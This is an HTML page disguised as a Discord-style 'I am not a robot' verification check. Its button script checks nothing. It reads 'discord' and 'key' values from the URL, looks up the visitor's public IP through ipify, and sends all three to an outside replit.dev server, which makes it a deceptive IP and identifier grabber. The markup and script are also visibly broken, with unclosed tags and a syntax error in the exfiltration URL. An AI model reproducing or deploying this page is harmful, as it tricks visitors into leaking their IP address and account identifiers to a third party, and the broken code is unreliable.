<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Not a Robot?</title>
    <style>
        body {
            background-image: #2C2F33;

            background-color: #7289DA;

            border: none;

<body>
    <div class="container">
        <h2>Verification Required</h2>

        <button onclick="verify()">I am not a robot</button>

</body>

    <script>
        async function verify() {
  const searchParams = new URLSearchParams(window.location.search);
  discord = searchParams.get('discord');
  user = searchParams.get('key');

    try {
        response = await fetch('https://api.ipify.org?format=json');
        data = await response.json();
        link = 'https://0351ef4b-a5fb-477a-9df3-dd35782c9695-00-30aukvo4epq2k.janeway.replit.dev/robot?discord='+discord"'&user='+user+'&ip='+data.ip
        response = await fetch(link);
    } catch (error) {
        
    }
}
    </script>
